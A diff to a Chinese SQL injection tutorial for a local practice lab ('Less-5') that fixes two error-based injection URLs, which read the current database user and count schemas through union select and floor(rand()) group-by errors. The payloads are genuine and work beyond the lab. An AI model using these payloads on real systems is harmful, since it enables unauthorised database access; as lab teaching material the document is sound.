@@ -131,7 +131,7 @@ http://127.0.0.1/Less-5/?id=' union select 1, count(*), concat('~',(select versi
 
 获取当前用户
 `
-http://127.0.0.1/Less-5/?id=' union select 1, count(*), concat('~',(select users()),'~', floor(rand()*2)) as a from users group by a --+
+http://127.0.0.1/Less-5/?id=' union select 1, count(*), concat('~',(select user()),'~', floor(rand()*2)) as a from users group by a --+
 `
 ![](luffy15.png)
 
@@ -142,7 +142,7 @@ http://127.0.0.1/Less-5/?id=' union select 1, count(*), concat('~',(select users
 
 
 `
-http://127.0.0.1/Less-5/?id=' union select 123, count(*), concat('~',(select count(*) from information_schema.schemata where table_schema="security" ),'~', floor(rand()*2)) as a from information_schema.tables group by a --+
+http://127.0.0.1/Less-5/?id=' union select 123, count(*), concat('~',(select count(*) from information_schema.schemata),'~', floor(rand()*2)) as a from information_schema.tables group by a --+
 
 `
 ![](luffy16.png)
